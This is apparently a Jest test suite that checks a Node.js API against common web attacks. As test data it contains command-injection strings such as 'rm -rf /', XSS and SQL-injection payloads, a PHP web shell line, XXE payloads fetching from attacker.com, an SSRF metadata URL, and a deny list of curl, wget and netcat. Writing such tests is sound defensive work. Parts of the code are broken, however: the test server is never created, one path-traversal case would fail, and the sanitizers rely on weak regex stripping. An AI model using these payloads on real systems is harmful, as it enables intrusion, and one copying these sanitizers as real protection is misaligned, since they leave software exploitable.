/**
 * Comprehensive Security Testing Suite
 * Tests for API keys, authentication, input validation, and security vulnerabilities
 */

const request = require('supertest');
const path = require('path');
const fs = require('fs').promises;
const crypto = require('crypto');

describe('🛡️ Security Testing Suite', () => {
    let testServer;
    let securityTestCases;
    let mockApiKey;
    
    beforeAll(async () => {
        // Generate test API key
        mockApiKey = crypto.randomBytes(32).toString('hex');
        
        // Load security test cases
        securityTestCases = global.generateSecurityTestCases();
        
        console.log('🔒 Security test suite initialized');
    });
    
    afterAll(async () => {
        if (testServer) {
            await testServer.close();
        }
    });
    
    describe('Authentication & Authorization', () => {
        test('should reject requests without API key', async () => {
            const response = await request(testServer)
                .get('/api/status')
                .expect(401);
                
            expect(response.body).toHaveProperty('error');
            expect(response.body.error).toMatch(/unauthorized|authentication/i);
        });
        
        test('should reject requests with invalid API key', async () => {
            const response = await request(testServer)
                .get('/api/status')
                .set('Authorization', 'Bearer invalid-key')
                .expect(401);
                
            expect(response.body).toHaveProperty('error');
        });
        
        test('should accept requests with valid API key', async () => {
            const response = await request(testServer)
                .get('/api/status')
                .set('Authorization', `Bearer ${mockApiKey}`)
                .expect(200);
                
            expect(response.body).toHaveProperty('status');
        });
        
        test('should validate API key format', () => {
            const validKeys = [
                'abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890',
                'A1B2C3D4E5F6789012345678901234567890123456789012345678901234ABCD'
            ];
            
            const invalidKeys = [
                'short-key',
                'key with spaces',
                'key-with-special-chars!@#',
                '',
                null,
                undefined
            ];
            
            validKeys.forEach(key => {
                expect(key).toMatch(/^[a-fA-F0-9]{64}$/);
            });
            
            invalidKeys.forEach(key => {
                if (key) {
                    expect(key).not.toMatch(/^[a-fA-F0-9]{64}$/);
                }
            });
        });
        
        test('should implement rate limiting', async () => {
            const requests = [];
            
            // Send rapid requests
            for (let i = 0; i < 20; i++) {
                requests.push(
                    request(testServer)
                        .get('/api/status')
                        .set('Authorization', `Bearer ${mockApiKey}`)
                );
            }
            
            const responses = await Promise.all(requests);
            const rateLimitedResponses = responses.filter(r => r.status === 429);
            
            // Should have some rate limited responses
            expect(rateLimitedResponses.length).toBeGreaterThan(0);
        });
    });
    
    describe('Input Validation & Sanitization', () => {
        test('should sanitize file paths to prevent directory traversal', () => {
            const maliciousPaths = [
                '../../../etc/passwd',
                '..\\..\\..\\windows\\system32\\config\\sam',
                '/etc/passwd',
                'C:\\Windows\\System32\\config\\SAM',
                'file://etc/passwd',
                '....//....//....//etc/passwd'
            ];
            
            maliciousPaths.forEach(maliciousPath => {
                // Simulate path sanitization
                const sanitized = path.normalize(maliciousPath)
                    .replace(/^(\.\.[\/\\])+/, '')
                    .replace(/[^a-zA-Z0-9\-_\.\/\\]/g, '');
                
                expect(sanitized).not.toContain('../');
                expect(sanitized).not.toContain('..\\');
                expect(sanitized).not.toMatch(/etc\/passwd/);
                expect(sanitized).not.toMatch(/system32/i);
            });
        });
        
        test('should validate and sanitize command injection attempts', () => {
            const commandInjections = [
                '; cat /etc/passwd',
                '| whoami',
                '&& rm -rf /',
                '`cat /etc/passwd`',
                '$(whoami)',
                '\n cat /etc/passwd',
                '\r\n del /f /q C:\\*.*'
            ];
            
            commandInjections.forEach(injection => {
                // Simulate command sanitization
                const sanitized = injection
                    .replace(/[;&|`$()\\]/g, '')
                    .replace(/[\r\n]/g, '')
                    .trim();
                
                expect(sanitized).not.toContain(';');
                expect(sanitized).not.toContain('|');
                expect(sanitized).not.toContain('&');
                expect(sanitized).not.toContain('`');
                expect(sanitized).not.toContain('$');
                expect(sanitized).not.toContain('\\n');
                expect(sanitized).not.toContain('\\r');
            });
        });
        
        test('should validate process names and arguments', () => {
            const validProcessNames = ['node', 'python', 'php', 'npm', 'yarn'];
            const invalidProcessNames = [
                'rm -rf',
                'cat /etc/passwd',
                'net user admin',
                '../../../usr/bin/evil',
                'cmd.exe /c format c:'
            ];
            
            validProcessNames.forEach(name => {
                expect(name).toMatch(/^[a-zA-Z0-9\-_\.]+$/);
                expect(name.length).toBeLessThan(100);
            });
            
            invalidProcessNames.forEach(name => {
                const hasSpaces = name.includes(' ');
                const hasSlashes = name.includes('/') || name.includes('\\');
                const hasDots = name.includes('..');
                
                expect(hasSpaces || hasSlashes || hasDots).toBe(true);
            });
        });
    });
    
    describe('XSS Prevention', () => {
        test('should sanitize HTML input', () => {
            const xssAttempts = [
                '<script>alert("xss")</script>',
                '<img src=x onerror=alert("xss")>',
                '<svg onload=alert("xss")>',
                'javascript:alert("xss")',
                '<iframe src="javascript:alert(\'xss\')"></iframe>',
                '<object data="javascript:alert(\'xss\')"></object>'
            ];
            
            xssAttempts.forEach(xss => {
                // Simulate HTML sanitization
                const sanitized = xss
                    .replace(/<script\b[^<]*(?:(?!<\/script>)<[^<]*)*<\/script>/gi, '')
                    .replace(/<[^>]+>/g, '')
                    .replace(/javascript:/gi, '')
                    .replace(/on\w+\s*=/gi, '');
                
                expect(sanitized).not.toMatch(/<script/i);
                expect(sanitized).not.toMatch(/javascript:/i);
                expect(sanitized).not.toMatch(/on\w+\s*=/i);
                expect(sanitized).not.toContain('<');
                expect(sanitized).not.toContain('>');
            });
        });
    });
    
    describe('SQL Injection Prevention', () => {
        test('should sanitize SQL injection attempts', () => {
            const sqlInjections = [
                "'; DROP TABLE users; --",
                "' OR '1'='1",
                "'; EXEC xp_cmdshell('dir'); --",
                "UNION SELECT * FROM users",
                "1' AND 1=1 --",
                "admin'--",
                "' OR 1=1#"
            ];
            
            sqlInjections.forEach(injection => {
                // Simulate SQL sanitization (parameterized queries simulation)
                const sanitized = injection
                    .replace(/'/g, "''")  // Escape single quotes
                    .replace(/;/g, '')    // Remove semicolons
                    .replace(/--/g, '')   // Remove SQL comments
                    .replace(/#/g, '')    // Remove hash comments
                    .replace(/\bUNION\b/gi, '')
                    .replace(/\bDROP\b/gi, '')
                    .replace(/\bEXEC\b/gi, '');
                
                expect(sanitized).not.toMatch(/;\s*DROP/i);
                expect(sanitized).not.toMatch(/UNION\s+SELECT/i);
                expect(sanitized).not.toMatch(/EXEC\s+/i);
                expect(sanitized).not.toContain('--');
                expect(sanitized).not.toContain('#');
            });
        });
    });
    
    describe('File Upload Security', () => {
        test('should validate file types and extensions', () => {
            const allowedExtensions = ['.txt', '.log', '.json', '.md'];
            const dangerousExtensions = [
                '.exe', '.bat', '.cmd', '.sh', '.php', '.jsp',
                '.aspx', '.js', '.vbs', '.ps1', '.scr'
            ];
            
            allowedExtensions.forEach(ext => {
                expect(allowedExtensions).toContain(ext);
            });
            
            dangerousExtensions.forEach(ext => {
                expect(allowedExtensions).not.toContain(ext);
            });
        });
        
        test('should validate file content', async () => {
            const maliciousContent = [
                '<?php system($_GET["cmd"]); ?>',
                '<script>alert("xss")</script>',
                '#!/bin/bash\\nrm -rf /',
                'eval(base64_decode($_POST["code"]))'
            ];
            
            maliciousContent.forEach(content => {
                // Simulate content scanning
                const hasPHP = content.includes('<?php');
                const hasScript = content.includes('<script');
                const hasShebang = content.includes('#!/');
                const hasEval = content.includes('eval(');
                
                const isDangerous = hasPHP || hasScript || hasShebang || hasEval;
                expect(isDangerous).toBe(true);
            });
        });
    });
    
    describe('Process Security', () => {
        test('should validate process execution permissions', () => {
            const safeCommands = ['node', 'npm', 'yarn', 'python', 'php'];
            const dangerousCommands = [
                'rm', 'del', 'format', 'fdisk', 'dd',
                'chmod', 'chown', 'su', 'sudo',
                'curl', 'wget', 'nc', 'netcat'
            ];
            
            safeCommands.forEach(cmd => {
                // Simulate command whitelist check
                expect(safeCommands).toContain(cmd);
            });
            
            dangerousCommands.forEach(cmd => {
                expect(safeCommands).not.toContain(cmd);
            });
        });
        
        test('should implement process isolation', () => {
            const processConfig = {
                uid: process.getuid ? process.getuid() : null,
                gid: process.getgid ? process.getgid() : null,
                cwd: '/tmp/isolated',
                env: { NODE_ENV: 'test', PATH: '/usr/bin' }
            };
            
            // Verify isolation settings
            expect(processConfig.cwd).not.toContain('/root');
            expect(processConfig.cwd).not.toContain('/home');
            expect(processConfig.env.PATH).not.toContain('/sbin');
            
            if (processConfig.uid) {
                expect(processConfig.uid).toBeGreaterThan(0); // Not root
            }
        });
    });
    
    describe('Network Security', () => {
        test('should validate allowed ports and hosts', () => {
            const allowedPorts = [3000, 8080, 8000, 5000];
            const dangerousPorts = [22, 23, 25, 53, 80, 443, 993, 995];
            const allowedHosts = ['localhost', '127.0.0.1', '::1'];
            const dangerousHosts = ['0.0.0.0', 'evil.com', '192.168.1.1'];
            
            allowedPorts.forEach(port => {
                expect(port).toBeGreaterThan(1024);
                expect(port).toBeLessThan(65536);
            });
            
            allowedHosts.forEach(host => {
                const isLocalhost = host === 'localhost' || 
                                  host === '127.0.0.1' || 
                                  host === '::1';
                expect(isLocalhost).toBe(true);
            });
        });
        
        test('should implement connection timeouts', () => {
            const connectionConfig = {
                timeout: 5000,
                keepAliveTimeout: 10000,
                headersTimeout: 5000,
                requestTimeout: 10000
            };
            
            Object.values(connectionConfig).forEach(timeout => {
                expect(timeout).toBeGreaterThan(0);
                expect(timeout).toBeLessThanOrEqual(30000); // Max 30 seconds
            });
        });
    });
    
    describe('Data Protection', () => {
        test('should not log sensitive information', () => {
            const logEntry = {
                timestamp: new Date().toISOString(),
                level: 'info',
                message: 'User login attempt',
                user: 'test@example.com',
                ip: '127.0.0.1',
                // Should not include password, API keys, tokens
            };
            
            const sensitiveFields = ['password', 'token', 'apiKey', 'secret'];
            
            sensitiveFields.forEach(field => {
                expect(logEntry).not.toHaveProperty(field);
            });
        });
        
        test('should mask sensitive data in responses', () => {
            const userResponse = {
                id: 123,
                email: 'test@example.com',
                name: 'Test User',
                apiKey: 'sk_test_****masked****',
                createdAt: '2023-01-01T00:00:00Z'
            };
            
            // API key should be masked
            expect(userResponse.apiKey).toContain('****');
            expect(userResponse.apiKey).not.toMatch(/^sk_test_[a-zA-Z0-9]{32}$/);
        });
    });
    
    describe('Error Handling Security', () => {
        test('should not expose internal information in error messages', () => {
            const secureErrorMessage = 'Authentication failed';
            const insecureErrorMessages = [
                'User "admin" not found in database table "users"',
                'MySQL connection failed: Access denied for user "root"',
                'File "/etc/passwd" not found',
                'Process failed: /usr/bin/node /app/secret.js'
            ];
            
            // Secure error should be generic
            expect(secureErrorMessage).not.toContain('database');
            expect(secureErrorMessage).not.toContain('table');
            expect(secureErrorMessage).not.toContain('file');
            expect(secureErrorMessage).not.toContain('/');
            
            // Insecure errors expose too much
            insecureErrorMessages.forEach(message => {
                const exposesInternal = message.includes('database') ||
                                      message.includes('table') ||
                                      message.includes('/') ||
                                      message.includes('root') ||
                                      message.includes('admin');
                                      
                expect(exposesInternal).toBe(true);
            });
        });
    });
    
    describe('Security Headers', () => {
        test('should include security headers in responses', async () => {
            if (!testServer) return;
            
            const response = await request(testServer)
                .get('/api/status')
                .set('Authorization', `Bearer ${mockApiKey}`);
            
            // Check for security headers
            expect(response.headers).toHaveProperty('x-content-type-options', 'nosniff');
            expect(response.headers).toHaveProperty('x-frame-options', 'DENY');
            expect(response.headers).toHaveProperty('x-xss-protection', '1; mode=block');
            expect(response.headers['strict-transport-security']).toBeDefined();
        });
    });
    
    describe('Advanced Vulnerability Testing', () => {
        test('should prevent server-side request forgery (SSRF)', async () => {
            const ssrfAttempts = [
                'http://169.254.169.254/latest/meta-data/',  // AWS metadata
                'http://localhost:22',                        // SSH port
                'http://127.0.0.1:3306',                    // MySQL port
                'file:///etc/passwd',                        // Local file access
                'gopher://127.0.0.1:8080',                  // Gopher protocol
                'ftp://internal-server.local/admin',         // FTP protocol
                'ldap://internal-ldap.local/admin'           // LDAP protocol
            ];
            
            for (const maliciousUrl of ssrfAttempts) {
                // Simulate URL validation
                const isBlocked = await validateUrl(maliciousUrl);
                expect(isBlocked).toBe(false); // URL should be blocked
            }
            
            function validateUrl(url) {
                try {
                    const parsedUrl = new URL(url);
                    
                    // Block non-HTTP(S) protocols
                    if (!['http:', 'https:'].includes(parsedUrl.protocol)) {
                        return false;
                    }
                    
                    // Block private/internal IP ranges
                    const hostname = parsedUrl.hostname;
                    const privateRanges = [
                        /^127\./,           // Loopback
                        /^10\./,            // Private Class A
                        /^172\.(1[6-9]|2[0-9]|3[01])\./,  // Private Class B
                        /^192\.168\./,      // Private Class C
                        /^169\.254\./,      // Link-local
                        /^::1$/,            // IPv6 loopback
                        /^fc00:/,           // IPv6 private
                        /^fe80:/            // IPv6 link-local
                    ];
                    
                    for (const range of privateRanges) {
                        if (range.test(hostname)) {
                            return false;
                        }
                    }
                    
                    // Block localhost variations
                    const localhostVariations = [
                        'localhost', '0.0.0.0', '0', '127.1', '127.0.1'
                    ];
                    
                    if (localhostVariations.includes(hostname)) {
                        return false;
                    }
                    
                    return true; // URL passes validation
                } catch (error) {
                    return false; // Invalid URL format
                }
            }
        });
        
        test('should prevent XML External Entity (XXE) attacks', () => {
            const xxePayloads = [
                '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
                '<?xml version="1.0"?><!DOCTYPE data [<!ENTITY file SYSTEM "file:///etc/passwd">]><data>&file;</data>',
                '<?xml version="1.0"?><!DOCTYPE data [<!ENTITY file SYSTEM "http://attacker.com/steal">]><data>&file;</data>',
                '<!DOCTYPE test [<!ENTITY % xxe SYSTEM "http://attacker.com/xxe.dtd"> %xxe;]>',
                '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % ext SYSTEM "file:///etc/passwd"> %ext;]>',
            ];
            
            xxePayloads.forEach(payload => {
                const isSafe = isXMLSafe(payload);
                expect(isSafe).toBe(false); // Should be flagged as unsafe
            });
            
            function isXMLSafe(xmlContent) {
                // Check for DOCTYPE declarations
                if (/<!DOCTYPE/i.test(xmlContent)) {
                    return false;
                }
                
                // Check for entity declarations
                if (/<!ENTITY/i.test(xmlContent)) {
                    return false;
                }
                
                // Check for SYSTEM references
                if (/SYSTEM\s+["|']/i.test(xmlContent)) {
                    return false;
                }
                
                // Check for external references
                if (/file:\/\/|http:\/\/|https:\/\//i.test(xmlContent)) {
                    return false;
                }
                
                return true;
            }
        });
    });
    
    describe('Configuration Security Validation', () => {
        test('should validate secure configuration settings', () => {
            const secureConfig = {
                server: {
                    host: '127.0.0.1',
                    port: 3000,
                    httpsOnly: true,
                    maxConnections: 1000,
                    timeout: 30000
                },
                auth: {
                    requireApiKey: true,
                    keyLength: 64,
                    allowedOrigins: ['https://localhost:3000'],
                    sessionTimeout: 1800000 // 30 minutes
                },
                security: {
                    enableCSP: true,
                    enableHSTS: true,
                    rateLimiting: true,
                    maxRequestSize: '10mb',
                    allowedCommands: ['node', 'npm', 'yarn', 'python', 'php']
                }
            };
            
            const insecureConfig = {
                server: {
                    host: '0.0.0.0', // Insecure: binds to all interfaces
                    port: 80,        // Insecure: standard HTTP port
                    httpsOnly: false,
                    maxConnections: -1, // Insecure: unlimited connections
                    timeout: 0       // Insecure: no timeout
                },
                auth: {
                    requireApiKey: false, // Insecure: no authentication
                    keyLength: 8,         // Insecure: weak key
                    allowedOrigins: ['*'], // Insecure: allows all origins
                    sessionTimeout: -1    // Insecure: no session timeout
                },
                security: {
                    enableCSP: false,    // Insecure: no CSP
                    enableHSTS: false,   // Insecure: no HSTS
                    rateLimiting: false, // Insecure: no rate limiting
                    maxRequestSize: '100gb', // Insecure: huge request size
                    allowedCommands: ['*']   // Insecure: allows all commands
                }
            };
            
            // Validate secure configuration
            expect(validateConfig(secureConfig)).toBe(true);
            
            // Validate insecure configuration should fail
            expect(validateConfig(insecureConfig)).toBe(false);
            
            function validateConfig(config) {
                // Check server configuration
                if (config.server.host === '0.0.0.0') return false;
                if (config.server.port < 1024 && config.server.port !== 443) return false;
                if (!config.server.httpsOnly) return false;
                if (config.server.maxConnections < 0) return false;
                if (config.server.timeout <= 0) return false;
                
                // Check authentication configuration
                if (!config.auth.requireApiKey) return false;
                if (config.auth.keyLength < 32) return false;
                if (config.auth.allowedOrigins.includes('*')) return false;
                if (config.auth.sessionTimeout <= 0) return false;
                
                // Check security configuration
                if (!config.security.enableCSP) return false;
                if (!config.security.enableHSTS) return false;
                if (!config.security.rateLimiting) return false;
                if (parseInt(config.security.maxRequestSize) > 50 * 1024 * 1024) return false; // 50MB max
                if (config.security.allowedCommands.includes('*')) return false;
                
                return true;
            }
        });
    });
});